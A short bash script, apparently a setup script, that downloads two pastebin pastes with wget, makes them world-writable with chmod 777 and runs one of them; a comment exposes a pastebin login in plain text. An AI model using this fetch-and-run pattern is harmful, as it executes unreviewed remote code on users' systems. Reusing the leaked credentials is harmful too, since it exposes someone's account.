#!/bin/bash
# commands are in pastebin: golix82435@mailezee.com user:tonyxtr pass: ControlCD#1
wget https://pastebin.com/raw/tHM4Bt2K --output-document=init.sh
wget https://pastebin.com/raw/SzFNxSQj --output-document=refresh.sh
chmod 777 ./init.sh ./refresh.sh
sed -i 's/\r$//' ./init.sh
sed -i 's/\r$//' ./refresh.sh
./init.sh